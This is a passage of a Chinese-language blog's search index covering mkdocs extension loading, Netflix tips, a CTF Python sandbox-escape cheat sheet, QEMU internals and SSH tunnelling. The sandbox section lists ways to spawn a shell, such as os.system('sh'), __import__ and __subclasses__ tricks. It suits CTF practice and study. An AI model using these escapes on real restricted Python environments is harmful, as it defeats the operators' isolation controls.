\u4e4b\u5916\uff0c\u9084\u53ef\u4ee5\u7528 pymdown-extensions","title":"\u90e8\u843d\u683c\u7dad\u8b77\u65e5\u8a18 - mkdocs extensions"},{"location":"topics/mkdocs-extensions/#pymdown-extensions","text":"\u8981\u5b89\u88dd\u9019\u500b python packages \u5f88\u7c21\u55ae\uff0c\u8ddf\u4e00\u822c\u7684 python package \u6c92\u5169\u6a23 pip install pymdown-extensions \u4f46\u662f\u554f\u984c\u662f\uff0cmkdocs \u5230\u5e95\u662f\u600e\u9ebc\u77e5\u9053 pymdown-extensions \u5728\u54ea\u88e1\u7684\uff0c\u4ed6\u600e\u9ebc\u8f09\u5165\u7684? mkdocs/nav.py#L291 ( mkdocs==0.17.2 ) 291 292 293 294 295 md = markdown . Markdown ( extensions = extensions , extension_configs = config [ 'mdx_configs' ] or {} ) self . content = md . convert ( self . markdown ) \u53ef\u4ee5\u770b\u5230\u4ed6\u662f\u53bb\u5275\u5efa\u4e00\u500b Markdown \u7269\u4ef6\uff0c\u7136\u5f8c\u518d\u7528 convert \u800c\u9019\u908a\u7684 extensions \u5c31\u662f ['pymdownx.arithmatex', 'pymdownx.caret', ...] \u90a3\u6240\u4ee5 Python-Markdown \u662f\u600e\u9ebc\u7528\u9019\u4e9b\u5b57\u4e32\u53bb\u627e\u6211\u5011\u5b89\u88dd\u7684 extensions \u5462? markdown/core.py#L162 ( Markdown==3.0.1 ) 162 163 164 165 166 167 168 169 # Get class name (if provided): `path.to.module:ClassName` ext_name , class_name = ext_name . split ( ':' , 1 ) if ':' in ext_name else ( ext_name , '' ) try : module = importlib . import_module ( ext_name ) logger . debug ( 'Successfuly imported extension module \" %s \".' % ext_name ) \u53ef\u4ee5\u770b\u5230\u4ed6\u662f\u76f4\u63a5\u53bb import \u6211\u5011\u7d66\u7684\u5b57\u4e32\uff0c\u6240\u4ee5\u53ea\u8981 pip install \u6709\u88dd\u597d\u53ef\u4ee5 import \u5c31\u53ef\u4ee5\u4e86 \u8ffd\u5b8c source code \u4e4b\u5f8c\u624d\u770b\u61c2\u4ed6\u7684 document \u4e0a\u9762\u5beb\u7684\u662f\u4ec0\u9ebc\u610f\u601d... markdown.markdown(some_text, extensions=[MyExtClass(), 'myext', 'path.to.my.ext:MyExtClass']) path.to.my.ext \u5c31\u662f\u8981 import \u7684 module MyExtClass \u5982\u679c\u6709\u7d66\u5c31\u76f4\u63a5\u7528\u6307\u5b9a\u7684 Class\uff0c\u6c92\u6709\u7684\u8a71\u6703\u53bb\u7528 makeExtension() \u7684\u56de\u50b3\u503c \u7d50\u8ad6\u662f\uff0c\u53ea\u8981 pip install \u5b8c\u5c31\u6c92\u4e8b\u4e86xD","title":"\u5b89\u88dd pymdown-extensions"},{"location":"topics/netflix/","text":"\u8abf\u6574\u901f\u5ea6 \u53ef\u4ee5\u7528\u9019\u500b chrome \u63d2\u4ef6 Video Speed Controller \u9019\u500b\u63d2\u4ef6\u53ef\u4ee5\u7528\u4f86\u8abf\u6574 html5 video ( netflix \u5728\u700f\u89bd\u5668\u4e0a\u7528\u7684 ) \u7684\u901f\u5ea6 VPN \u4e0d\u540c\u5730\u5340\u6388\u6b0a\u7684\u5f71\u7247\u4e5f\u4e0d\u592a\u4e00\u6a23\uff0c\u53ef\u4ee5\u5230 uNoGS \u4e0a\u9762\u67e5\u8a62\u60f3\u8981\u770b\u7684\u5f71\u7247\u5728\u54ea\u88e1\u624d\u53ef\u4ee5\u770b\uff0c\u7136\u5f8c\u8df3 vpn \u904e\u53bb \u4e2d\u6587\u5b57\u5e55 \u4e0d\u5728\u53f0\u7063\u5730\u5340\u7684\u5f71\u7247\u5927\u90e8\u5206\u90fd\u6c92\u6709\u4e2d\u6587\u5b57\u5e55 \u4e0a\u7db2\u627e\u4e2d\u6587\u5b57\u5e55\uff0c\u6bd4\u5982\u9019\u500b\u7db2\u7ad9 subhd \u7528\u9019\u500b\u7db2\u7ad9 subtitle converter \u628a\u5176\u4ed6\u683c\u5f0f\u7684\u5b57\u5e55\u6a94 dfxp \u683c\u5f0f ( netflix \u5b57\u5e55\u6a94\u683c\u5f0f) CTRL + OPTION + SHIFT + t \u8f09\u5165\u5b57\u5e55 \u96b1\u85cf\u9762\u677f \u6578\u64da\u9762\u677f : CTRL + OPTION + SHIFT + d / CTRL + OPTION + SHIFT + q \u65e5\u8a8c\u9762\u677f : CTRL + OPTION + SHIFT + l \u96b1\u85cf\u985e\u5225 netflix \u6709\u4e00\u5927\u5806\u5206\u985e \u6bd4\u5982 http://www.netflix.com/browse/genre/10118 \u662f \u6f2b\u756b\u53ca\u8d85\u7d1a\u82f1\u96c4\u7247 \u5206\u985e url \u5f8c\u9762\u586b\u4e0d\u540c\u7684\u6578\u5b57\u5c31\u6709\u4e0d\u540c\u7684\u5206\u985e https://www.pantz.org/software/chrome/netflix_streaming_playback_speed_and_hidden_menus.html \u21a9 https://blog.gslin.org/archives/2016/04/09/6485/%E7%94%A8%E7%80%8F%E8%A6%BD%E5%99%A8%E7%9C%8B-netflix-%E5%8A%A0%E9%80%9F%E6%92%AD%E6%94%BE/ \u21a9","title":"\u770b\u7247\u5c0f\u6280\u5de7 - Netflix"},{"location":"topics/netflix/#_1","text":"\u53ef\u4ee5\u7528\u9019\u500b chrome \u63d2\u4ef6 Video Speed Controller \u9019\u500b\u63d2\u4ef6\u53ef\u4ee5\u7528\u4f86\u8abf\u6574 html5 video ( netflix \u5728\u700f\u89bd\u5668\u4e0a\u7528\u7684 ) \u7684\u901f\u5ea6","title":"\u8abf\u6574\u901f\u5ea6"},{"location":"topics/netflix/#vpn","text":"\u4e0d\u540c\u5730\u5340\u6388\u6b0a\u7684\u5f71\u7247\u4e5f\u4e0d\u592a\u4e00\u6a23\uff0c\u53ef\u4ee5\u5230 uNoGS \u4e0a\u9762\u67e5\u8a62\u60f3\u8981\u770b\u7684\u5f71\u7247\u5728\u54ea\u88e1\u624d\u53ef\u4ee5\u770b\uff0c\u7136\u5f8c\u8df3 vpn \u904e\u53bb","title":"VPN"},{"location":"topics/netflix/#_2","text":"\u4e0d\u5728\u53f0\u7063\u5730\u5340\u7684\u5f71\u7247\u5927\u90e8\u5206\u90fd\u6c92\u6709\u4e2d\u6587\u5b57\u5e55 \u4e0a\u7db2\u627e\u4e2d\u6587\u5b57\u5e55\uff0c\u6bd4\u5982\u9019\u500b\u7db2\u7ad9 subhd \u7528\u9019\u500b\u7db2\u7ad9 subtitle converter \u628a\u5176\u4ed6\u683c\u5f0f\u7684\u5b57\u5e55\u6a94 dfxp \u683c\u5f0f ( netflix \u5b57\u5e55\u6a94\u683c\u5f0f) CTRL + OPTION + SHIFT + t \u8f09\u5165\u5b57\u5e55","title":"\u4e2d\u6587\u5b57\u5e55"},{"location":"topics/netflix/#_3","text":"\u6578\u64da\u9762\u677f : CTRL + OPTION + SHIFT + d / CTRL + OPTION + SHIFT + q \u65e5\u8a8c\u9762\u677f : CTRL + OPTION + SHIFT + l","title":"\u96b1\u85cf\u9762\u677f"},{"location":"topics/netflix/#_4","text":"netflix \u6709\u4e00\u5927\u5806\u5206\u985e \u6bd4\u5982 http://www.netflix.com/browse/genre/10118 \u662f \u6f2b\u756b\u53ca\u8d85\u7d1a\u82f1\u96c4\u7247 \u5206\u985e url \u5f8c\u9762\u586b\u4e0d\u540c\u7684\u6578\u5b57\u5c31\u6709\u4e0d\u540c\u7684\u5206\u985e https://www.pantz.org/software/chrome/netflix_streaming_playback_speed_and_hidden_menus.html \u21a9 https://blog.gslin.org/archives/2016/04/09/6485/%E7%94%A8%E7%80%8F%E8%A6%BD%E5%99%A8%E7%9C%8B-netflix-%E5%8A%A0%E9%80%9F%E6%92%AD%E6%94%BE/ \u21a9","title":"\u96b1\u85cf\u985e\u5225"},{"location":"topics/python-sandbox/","text":"CTF \u6280\u5de7\u5f59\u6574 - Python Sandbox Challenge Python Sandbox \u7684\u984c\u76ee\u901a\u5e38\u90fd\u662f\u53ef\u4ee5\u8b93\u6211\u5011\u57f7\u884c python \u7684\u7a0b\u5f0f\u78bc\uff0c\u4f46\u662f\u6703\u6709\u5404\u7a2e\u6aa2\u67e5 \u76ee\u6a19 Get shell import os os . system ( \"sh\" ) import subprocess subprocess . Popen ([ \"sh\" ]) import sys sys . modules [ \"os\" ] . system ( \"sh\" ) \u5c0f\u6280\u5de7 __import__ import \u5176\u5be6\u662f\u53bb\u547c\u53eb __import__ __import__ ( \"os\" ) . system ( \"sh\" ) \u62c9\u573e\u5806 \u53ef\u4ee5\u5f9e\u9019\u4e9b\u5730\u65b9\u627e\u53ef\u4ee5\u7528\u7684\u6771\u897f globals () locals () {} . __class__ . __base__ . __subclasses__ () {} . __class__ . __mro__ [ 1 ] . __subclasses__ () getattr . \u53ef\u4ee5\u7528 getattr \u53d6\u4ee3 os . system ( \"sh\" ) getattr ( os , \"system\" )( \"sh\" ) \u5171\u4eab\u8996\u91ce \u7576\u6211\u5011\u6709\u4e00\u500b\u6a94\u6848 test.py \u9577\u9019\u6a23 import os def test (): print ( \"test\" ) \u6211\u5011\u53ef\u4ee5\u8ddf test \u51fd\u5f0f\u5171\u4eab\u8996\u91ce from test import test test . __globals__ [ \"os\" ] . system ( \"sh\" ) test . __globals__ [ \"__builtins__\" ][ \"__import__\" ]( \"os\" ) . system ( \"ls\" ) \u5404\u7a2e\u5e95\u7dda\u662f\u4ec0\u9ebc __builtins__ \u6703\u81ea\u52d5\u8f09\u5165\u70ba\u5168\u57df\u8b8a\u6578\uff0c\u5305\u62ec\u5404\u7a2e\u5167\u5efa\u51fd\u5f0f ( ex: print , dir , ... ) __builtins__ = __import__ ( \"__builtin__\" ) # python2 __builtins__ = __import__ ( \"builtins\" ) # python3","title":"CTF \u6280\u5de7\u5f59\u6574 - Python Sandbox Challenge"},{"location":"topics/python-sandbox/#ctf-python-sandbox-challenge","text":"Python Sandbox \u7684\u984c\u76ee\u901a\u5e38\u90fd\u662f\u53ef\u4ee5\u8b93\u6211\u5011\u57f7\u884c python \u7684\u7a0b\u5f0f\u78bc\uff0c\u4f46\u662f\u6703\u6709\u5404\u7a2e\u6aa2\u67e5","title":"CTF \u6280\u5de7\u5f59\u6574 - Python Sandbox Challenge"},{"location":"topics/python-sandbox/#_1","text":"Get shell import os os . system ( \"sh\" ) import subprocess subprocess . Popen ([ \"sh\" ]) import sys sys . modules [ \"os\" ] . system ( \"sh\" )","title":"\u76ee\u6a19"},{"location":"topics/python-sandbox/#_2","text":"","title":"\u5c0f\u6280\u5de7"},{"location":"topics/python-sandbox/#__import__","text":"import \u5176\u5be6\u662f\u53bb\u547c\u53eb __import__ __import__ ( \"os\" ) . system ( \"sh\" )","title":"__import__"},{"location":"topics/python-sandbox/#_3","text":"\u53ef\u4ee5\u5f9e\u9019\u4e9b\u5730\u65b9\u627e\u53ef\u4ee5\u7528\u7684\u6771\u897f globals () locals () {} . __class__ . __base__ . __subclasses__ () {} . __class__ . __mro__ [ 1 ] . __subclasses__ ()","title":"\u62c9\u573e\u5806"},{"location":"topics/python-sandbox/#getattr","text":". \u53ef\u4ee5\u7528 getattr \u53d6\u4ee3 os . system ( \"sh\" ) getattr ( os , \"system\" )( \"sh\" )","title":"getattr"},{"location":"topics/python-sandbox/#_4","text":"\u7576\u6211\u5011\u6709\u4e00\u500b\u6a94\u6848 test.py \u9577\u9019\u6a23 import os def test (): print ( \"test\" ) \u6211\u5011\u53ef\u4ee5\u8ddf test \u51fd\u5f0f\u5171\u4eab\u8996\u91ce from test import test test . __globals__ [ \"os\" ] . system ( \"sh\" ) test . __globals__ [ \"__builtins__\" ][ \"__import__\" ]( \"os\" ) . system ( \"ls\" )","title":"\u5171\u4eab\u8996\u91ce"},{"location":"topics/python-sandbox/#_5","text":"","title":"\u5404\u7a2e\u5e95\u7dda\u662f\u4ec0\u9ebc"},{"location":"topics/python-sandbox/#__builtins__","text":"\u6703\u81ea\u52d5\u8f09\u5165\u70ba\u5168\u57df\u8b8a\u6578\uff0c\u5305\u62ec\u5404\u7a2e\u5167\u5efa\u51fd\u5f0f ( ex: print , dir , ... ) __builtins__ = __import__ ( \"__builtin__\" ) # python2 __builtins__ = __import__ ( \"builtins\" ) # python3","title":"__builtins__"},{"location":"topics/qemu-internals/","text":"\u6df1\u5ea6\u4e4b\u65c5 - QEMU Internals \u88ab\u4eff\u771f\u7684\u5e73\u53f0\u53eb guest \u904b\u884c qemu \u7684\u5e73\u53f0\u53eb host QEMU \u7684\u904b\u4f5c\u539f\u7406\u7c21\u7565\u4f86\u8aaa\u5c31\u662f \u628a guest \u7684\u4ee3\u78bc\u7ffb\u8b6f\u6210 QEMU \u7684\u4e2d\u4ecb\u4ee3\u78bc \\to \\to \u628a QEMU \u7684\u4e2d\u4ecb\u4ee3\u78bc\u7ffb\u8b6f\u6210 host \u7684\u4ee3\u78bc \u4ee5\u4e0b\u4ee5 i386 \u70ba\u4e3b prepare \u5206\u6790\u5927\u578b\u7cfb\u7d71\u7684\u7a0b\u5f0f\u78bc\u9700\u8981\u5148\u6e96\u5099\u597d\u5de5\u5177\u5011\u5e6b\u52a9\u6211\u5011\u770b\u4ee3\u78bc vim ctags & cscope gdb build mkdir build cd build CFLAGS='-g3 -ggdb3 -gdwarf-4 -Og -Wno-error' ../configure && make \u52a0\u4e0a\u4e00\u4e9b debug \u7528\u7684 flags \u8b93\u6211\u5011\u53ef\u4ee5\u7528 gdb \u8ffd code \u4e0d\u52a0\u7684\u8a71\uff0cgdb \u57f7\u884c\u7684\u6642\u5019\uff0c\u4ee3\u78bc\u6703\u8df3\u4f86\u8df3\u53bb\uff0c\u56e0\u70ba\u7de8\u8b6f\u5668\u512a\u5316\u6703\u8b93\u4ee3\u78bc\u4e0d\u4e00\u5b9a\u7167\u9806\u5e8f\u57f7\u884c\uff0c\u800c\u4e14\u6703\u7f3a\u5c11 macro \u8cc7\u8a0a \u6709\u554f\u984c\u7684\u8a71 \u5982\u679c\u5f04\u4e0d\u6210\u529f\u6c92\u6709 macro \u7684\u8cc7\u8a0a\u6216\u4ee3\u78bc\u8df3\u4f86\u8df3\u53bb\u7684\u8a71 configure \u6703\u7522\u751f config-host.mak \uff0c\u53ef\u4ee5\u76f4\u63a5\u6539\u9019\u88e1\u9762\u7684 CFLAGS \u8a66\u8a66 \u780d\u6389\u6574\u500b build \u8cc7\u6599\u593e\u91cd\u4f86\uff0c\u8b93\u4ed6\u5168\u90e8\u91cd\u7de8\u4e00\u6b21 \u4e3b\u8981\u6d41\u7a0b translate \u5f9e guest \u7684\u4ee3\u78bc\u7522\u751f QEMU Intermediate Code main \\to \\to cpu_loop \\to \\to cpu_exec \\to \\to tb_find \\to \\to tb_gen_code \\to \\to gen_intermediate_code \\to \\to translator_loop \\to \\to i386_tr_translate_insn \\to \\to disas_insn \u5f9e QEMU Intermediate Code \u7522\u751f host \u7684\u4ee3\u78bc main \\to \\to cpu_loop \\to \\to cpu_exec \\to \\to tb_find \\to \\to tb_gen_code \\to \\to tcg_gen_code execute main \\to \\to cpu_loop \\to \\to cpu_exec \\to \\to cpu_loop_exec_tb \\to \\to cpu_tb_exec \\to \\to tcg_qemu_tb_exec translate \u4e3b\u8981\u7684\u51fd\u5f0f\u5728 accel/tcg/translator.c:translator_loop \u9019\u500b\u51fd\u5f0f\u4e00\u6b21\u7ffb\u8b6f\u4e00\u500b translation block ( TB ) \u88e1\u9762\u6709\u4e00\u500b\u8ff4\u5708\uff0c\u8dd1\u4e00\u6b21\u7ffb\u8b6f\u4e00\u689d\u6307\u4ee4 \u4e3b\u8981\u662f disas_insn \u9019\u500b\u51fd\u5f0f\u5728 parse assembly ( \u770b\u4e0d\u592a\u61c2\u53ef\u4ee5\u770b\u770b x86 Instructions Format ) \u7576\u6709 call, jmp, jg, je, ... \u7684 branch \u6307\u4ee4\u5c31\u6703\u8df3\u51fa\u8ff4\u5708 \u4e5f\u5c31\u662f\u6574\u500b\u4ee3\u78bc\u6703\u88ab branch \u6307\u4ee4\u5206\u6210\u5f88\u591a TB db->pc_first \u5c31\u662f\u76ee\u524d\u7ffb\u8b6f\u7684 TB \u7684\u958b\u982d db->pc_next \u5c31\u662f\u4e0b\u4e00\u500b\u8981\u7ffb\u8b6f\u7684\u5730\u65b9 (gdb) x/10i db->pc_first \u53ef\u4ee5\u770b\u4e00\u4e0b\u76ee\u524d TB \u672a\u7ffb\u8b6f\u7684\u4ee3\u78bc \u7ffb\u8b6f\u597d\u7684\u4ee3\u78bc\u6703\u653e\u5728 tcg_ctx \u9019\u500b\u5168\u57df\u8b8a\u6578\u88e1\u9762 while ( true ) { ... ops -> translate_insn ( db , cpu ); ... if ( db -> is_jmp != DISAS_NEXT ) { break ; } ... } execute tcg_qemu_tb_exec = ((uintptr_t (*)(void *, void *))tcg_ctx->code_gen_prologue)(env, tb_ptr)","title":"\u6df1\u5ea6\u4e4b\u65c5 - QEMU Internals"},{"location":"topics/qemu-internals/#-qemu-internals","text":"\u88ab\u4eff\u771f\u7684\u5e73\u53f0\u53eb guest \u904b\u884c qemu \u7684\u5e73\u53f0\u53eb host QEMU \u7684\u904b\u4f5c\u539f\u7406\u7c21\u7565\u4f86\u8aaa\u5c31\u662f \u628a guest \u7684\u4ee3\u78bc\u7ffb\u8b6f\u6210 QEMU \u7684\u4e2d\u4ecb\u4ee3\u78bc \\to \\to \u628a QEMU \u7684\u4e2d\u4ecb\u4ee3\u78bc\u7ffb\u8b6f\u6210 host \u7684\u4ee3\u78bc \u4ee5\u4e0b\u4ee5 i386 \u70ba\u4e3b","title":"\u6df1\u5ea6\u4e4b\u65c5 - QEMU Internals"},{"location":"topics/qemu-internals/#prepare","text":"\u5206\u6790\u5927\u578b\u7cfb\u7d71\u7684\u7a0b\u5f0f\u78bc\u9700\u8981\u5148\u6e96\u5099\u597d\u5de5\u5177\u5011\u5e6b\u52a9\u6211\u5011\u770b\u4ee3\u78bc vim ctags & cscope gdb","title":"prepare"},{"location":"topics/qemu-internals/#build","text":"mkdir build cd build CFLAGS='-g3 -ggdb3 -gdwarf-4 -Og -Wno-error' ../configure && make \u52a0\u4e0a\u4e00\u4e9b debug \u7528\u7684 flags \u8b93\u6211\u5011\u53ef\u4ee5\u7528 gdb \u8ffd code \u4e0d\u52a0\u7684\u8a71\uff0cgdb \u57f7\u884c\u7684\u6642\u5019\uff0c\u4ee3\u78bc\u6703\u8df3\u4f86\u8df3\u53bb\uff0c\u56e0\u70ba\u7de8\u8b6f\u5668\u512a\u5316\u6703\u8b93\u4ee3\u78bc\u4e0d\u4e00\u5b9a\u7167\u9806\u5e8f\u57f7\u884c\uff0c\u800c\u4e14\u6703\u7f3a\u5c11 macro \u8cc7\u8a0a","title":"build"},{"location":"topics/qemu-internals/#_1","text":"\u5982\u679c\u5f04\u4e0d\u6210\u529f\u6c92\u6709 macro \u7684\u8cc7\u8a0a\u6216\u4ee3\u78bc\u8df3\u4f86\u8df3\u53bb\u7684\u8a71 configure \u6703\u7522\u751f config-host.mak \uff0c\u53ef\u4ee5\u76f4\u63a5\u6539\u9019\u88e1\u9762\u7684 CFLAGS \u8a66\u8a66 \u780d\u6389\u6574\u500b build \u8cc7\u6599\u593e\u91cd\u4f86\uff0c\u8b93\u4ed6\u5168\u90e8\u91cd\u7de8\u4e00\u6b21","title":"\u6709\u554f\u984c\u7684\u8a71"},{"location":"topics/qemu-internals/#_2","text":"","title":"\u4e3b\u8981\u6d41\u7a0b"},{"location":"topics/qemu-internals/#translate","text":"","title":"translate"},{"location":"topics/qemu-internals/#guest-qemu-intermediate-code","text":"main \\to \\to cpu_loop \\to \\to cpu_exec \\to \\to tb_find \\to \\to tb_gen_code \\to \\to gen_intermediate_code \\to \\to translator_loop \\to \\to i386_tr_translate_insn \\to \\to disas_insn","title":"\u5f9e guest \u7684\u4ee3\u78bc\u7522\u751f QEMU Intermediate Code"},{"location":"topics/qemu-internals/#qemu-intermediate-code-host","text":"main \\to \\to cpu_loop \\to \\to cpu_exec \\to \\to tb_find \\to \\to tb_gen_code \\to \\to tcg_gen_code","title":"\u5f9e QEMU Intermediate Code \u7522\u751f host \u7684\u4ee3\u78bc"},{"location":"topics/qemu-internals/#execute","text":"main \\to \\to cpu_loop \\to \\to cpu_exec \\to \\to cpu_loop_exec_tb \\to \\to cpu_tb_exec \\to \\to tcg_qemu_tb_exec","title":"execute"},{"location":"topics/qemu-internals/#translate_1","text":"\u4e3b\u8981\u7684\u51fd\u5f0f\u5728 accel/tcg/translator.c:translator_loop \u9019\u500b\u51fd\u5f0f\u4e00\u6b21\u7ffb\u8b6f\u4e00\u500b translation block ( TB ) \u88e1\u9762\u6709\u4e00\u500b\u8ff4\u5708\uff0c\u8dd1\u4e00\u6b21\u7ffb\u8b6f\u4e00\u689d\u6307\u4ee4 \u4e3b\u8981\u662f disas_insn \u9019\u500b\u51fd\u5f0f\u5728 parse assembly ( \u770b\u4e0d\u592a\u61c2\u53ef\u4ee5\u770b\u770b x86 Instructions Format ) \u7576\u6709 call, jmp, jg, je, ... \u7684 branch \u6307\u4ee4\u5c31\u6703\u8df3\u51fa\u8ff4\u5708 \u4e5f\u5c31\u662f\u6574\u500b\u4ee3\u78bc\u6703\u88ab branch \u6307\u4ee4\u5206\u6210\u5f88\u591a TB db->pc_first \u5c31\u662f\u76ee\u524d\u7ffb\u8b6f\u7684 TB \u7684\u958b\u982d db->pc_next \u5c31\u662f\u4e0b\u4e00\u500b\u8981\u7ffb\u8b6f\u7684\u5730\u65b9 (gdb) x/10i db->pc_first \u53ef\u4ee5\u770b\u4e00\u4e0b\u76ee\u524d TB \u672a\u7ffb\u8b6f\u7684\u4ee3\u78bc \u7ffb\u8b6f\u597d\u7684\u4ee3\u78bc\u6703\u653e\u5728 tcg_ctx \u9019\u500b\u5168\u57df\u8b8a\u6578\u88e1\u9762 while ( true ) { ... ops -> translate_insn ( db , cpu ); ... if ( db -> is_jmp != DISAS_NEXT ) { break ; } ... }","title":"translate"},{"location":"topics/qemu-internals/#execute_1","text":"tcg_qemu_tb_exec = ((uintptr_t (*)(void *, void *))tcg_ctx->code_gen_prologue)(env, tb_ptr)","title":"execute"},{"location":"topics/ssh/","text":"\u6307\u4ee4\u6574\u7406 - SSH ssh config \u8a2d\u5b9a\u9019\u500b\u6a94\u6848 ~/.ssh/config basic config Host dev HostName 123.45.67.89 User oalieno Port 22000 \u9019\u6a23\u8a2d\u5b9a\u597d\u5f8c ssh dev \u5c31\u7b49\u540c\u65bc ssh -p 22000 oalieno@123.45.67.89 IdentityFile Host dev HostName 123.45.67.89 User oalieno Port 22000 IdentityFile ~/.ssh/id_rsa IdentityFile \u5c31\u662f\u6307\u5b9a\u8981\u7528\u54ea\u500b key\uff0c\u7b49\u540c\u65bc -i ~/.ssh/id_rsa \u9810\u8a2d\u6703\u6293 id_*.pub \u4e2d\u6700\u65b0\u7684 ( /usr/bin/ssh-copy-id 59 \u884c ) ssh tunnel ( port forwarding ) Host dev HostName 123.45.67.89 User oalieno Port 22000 LocalForward 5555 127.0.0.1:6666 \u5c07 local \u7684 5555 port \u900f\u904e ssh tunnel \u5c0d\u61c9\u5230 remote \u7684 6666 port \u9023\u7dda\u5230 local \u7684 5555 port \u7b49\u65bc\u9023\u7dda\u5230 remote \u7684 127.0.0.1 \u7684 6666 port \u4e0d\u4e00\u5b9a\u8981\u7528 127.0.0.1 \u4e5f\u53ef\u4ee5\u9023\u5230 remote \u51fa\u53bb\u7684 google.com:80 ( \u900f\u904e remote \u700f\u89bd google.com ) \u8a2d\u5b9a\u597d\u5f8c\u53ef\u4ee5\u76f4\u63a5\u6253\u4ee5\u4e0b\u6307\u4ee4 ssh -f -N dev # -f : run in background # -N : not execute remote command, useful for forwarding ports \u5c31\u6703\u7b49\u540c\u65bc\u4ee5\u4e0b\u6307\u4ee4 ssh -f -N -L 5555 :127.0.0.1:6666 oalieno@123.45.67.89 # -f : run in background # -N : not execute remote command, useful for forwarding ports reverse ssh tunnel ( reverse port forwarding ) Host dev HostName 123.45.67.89 User oalieno Port 22000 RemoteForward 6666 127.0.0.1:5555 \u5c07 remote \u7684 6666 port \u900f\u904e reverse ssh tunnel \u5c0d\u61c9\u5230 local \u7684 5555 port \u9023\u7dda\u5230 remote \u7684 6666 port \u7b49\u65bc\u9023\u7dda\u5230 local \u7684 5555 port \u4e0d\u4e00\u5b9a\u8981\u7528 127.0.0.1 \u4e5f\u53ef\u4ee5\u9023\u5230 local \u51fa\u53bb\u7684 google.com:80 ( \u900f\u904e local \u700f\u89bd google.com ) \u8a2d\u5b9a\u597d\u5f8c\u53ef\u4ee5\u76f4\u63a5\u6253\u4ee5\u4e0b\u6307\u4ee4 ssh -f -N dev # -f : run in background # -N : not execute remote command, useful for forwarding ports \u5c31\u6703\u7b49\u540c\u65bc\u4ee5\u4e0b\u6307\u4ee4 ssh -f -N -R 6666 :127.0.0.1:5555 oalieno@123.45.67.89 # -f : run in background # -N : not execute remote command, useful for forwarding ports dynamic port forwarding Host dev HostName 123.45.67.89 User oalieno Port 22000 DynamicForward 9999 \u8a2d\u5b9a\u597d\u5f8c\u53ef\u4ee5\u76f4\u63a5\u6253\u4ee5\u4e0b\u6307\u4ee4 ssh -f -N dev # -f : run in background # -N : not execute remote command, useful for forwarding ports \u5c31\u6703\u7b49\u540c\u65bc\u6253\u4ee5\u4e0b\u6307\u4ee4 ssh -f -N -D 9999 oalieno@123.45.67.89 # -f : run in background # -N : not execute remote command, useful for forwarding ports \u4e26\u5728\u96fb\u8166\u4e0a\u8a2d\u5b9a SOCKS \u4ee3\u7406\u4f3a\u670d\u5668 ( 127.0.0.1:9999 ) \u4e4b\u5f8c\u4f60\u53ef\u4ee5\u67e5\u627e\u4f60\u7684 ip \u4f4d\u5740 ( https://www.whatismyip.com/ ) \u6703\u767c\u73fe\u4f60\u5df2\u7d93\u8df3\u53bb 123.45.67.89 autossh Host dev HostName 123.45.67.89 User oalieno Port 22000 IdentityFile ~/.ssh/id_rsa LocalForward 5555 127.0.0.1:6666 ServerAliveInterval 30 ServerAliveCountMax 3 \u8a2d\u5b9a\u597d\u5f8c\u53ef\u4ee5\u76f4\u63a5\u6253\u4ee5\u4e0b\u6307\u4ee4 autossh -M 0 -f -N dev # -M 0 : autossh echo port, recommend disable it by setting it to 0 # -f : run in background # -N : not execute remote command, useful for forwarding ports \u5c31\u6703\u7b49\u540c\u65bc\u6253\u4ee5\u4e0b\u6307\u4ee4 autossh -M 0 -f -N -o \"ServerAliveInterval 30\" -o \"ServerAliveCountMax 3\" -L 5555 :localhost:6666 oalieno@123.45.67.89 # -M 0 : autossh echo port, recommend disable it by setting it to 0 # -f : run in background # -N : not execute remote command, useful for forwarding ports https://linux.die.net/man/5/ssh_config \u21a9 https://nerderati.com/2011/03/17/simplify-your-life-with-an-ssh-config-file/ \u21a9 https://www.everythingcli.org/ssh-tunnelling-for-fun-and-profit-local-vs-remote/ \u21a9","title":"\u6307\u4ee4\u6574\u7406 - SSH"},{"location":"topics/ssh/#-ssh","text":"","title":"\u6307\u4ee4\u6574\u7406 - SSH"},{"location":"topics/ssh/#ssh-config","text":"\u8a2d\u5b9a\u9019\u500b\u6a94\u6848 ~/.ssh/config","title":"ssh config"},{"location":"topics/ssh/#basic-config","text":"Host dev HostName 123.45.67.89 User oalieno Port 22000 \u9019\u6a23\u8a2d\u5b9a\u597d\u5f8c ssh dev \u5c31\u7b49\u540c\u65bc ssh -p 22000 oalieno@123.45.67.89","title":"basic config"},{"location":"topics/ssh/#identityfile","text":"Host dev HostName 123.45.67.89 User oalieno Port 22000 IdentityFile ~/.ssh/id_rsa IdentityFile \u5c31\u662f\u6307\u5b9a\u8981\u7528\u54ea\u500b key\uff0c\u7b49\u540c\u65bc -i ~/.ssh/id_rsa \u9810\u8a2d\u6703\u6293 id_*.pub \u4e2d\u6700\u65b0\u7684 ( /usr/bin/ssh-copy-id 59 \u884c )","title":"IdentityFile"},{"location":"topics/ssh/#ssh-tunnel-port-forwarding","text":"Host dev HostName 123.45.67.89 User oalieno Port 22000 LocalForward 5555 127.0.0.1:6666 \u5c07 local \u7684 5555 port \u900f\u904e ssh tunnel \u5c0d\u61c9\u5230 remote \u7684 6666 port \u9023\u7dda\u5230 local \u7684 5555 port \u7b49\u65bc\u9023\u7dda\u5230 remote \u7684 127.0.0.1 \u7684 6666 port \u4e0d\u4e00\u5b9a\u8981\u7528 127.0.0.1 \u4e5f\u53ef\u4ee5\u9023\u5230 remote \u51fa\u53bb\u7684 google.com:80 ( \u900f\u904e remote \u700f\u89bd google.com ) \u8a2d\u5b9a\u597d\u5f8c\u53ef\u4ee5\u76f4\u63a5\u6253\u4ee5\u4e0b\u6307\u4ee4 ssh -f -N dev # -f : run in background # -N : not execute remote command, useful for forwarding ports \u5c31\u6703\u7b49\u540c\u65bc\u4ee5\u4e0b\u6307\u4ee4 ssh -f -N -L 5555 :127.0.0.1:6666 oalieno@123.45.67.89 # -f : run in background # -N : not execute remote command, useful for forwarding ports","title":"ssh tunnel ( port forwarding )"},{"location":"topics/ssh/#reverse-ssh-tunnel-reverse-port-forwarding","text":"Host dev HostName 123.45.67.89 User oalieno Port 22000 RemoteForward 6666 127.0.0.1:5555 \u5c07 remote \u7684 6666 port \u900f\u904e reverse ssh tunnel \u5c0d\u61c9\u5230 local \u7684 5555 port \u9023\u7dda\u5230 remote \u7684 6666 port \u7b49\u65bc\u9023\u7dda\u5230 local \u7684 5555 port \u4e0d\u4e00\u5b9a\u8981\u7528 127.0.0.1 \u4e5f\u53ef\u4ee5\u9023\u5230 local \u51fa\u53bb\u7684 google.com:80 ( \u900f\u904e local \u700f\u89bd google.com ) 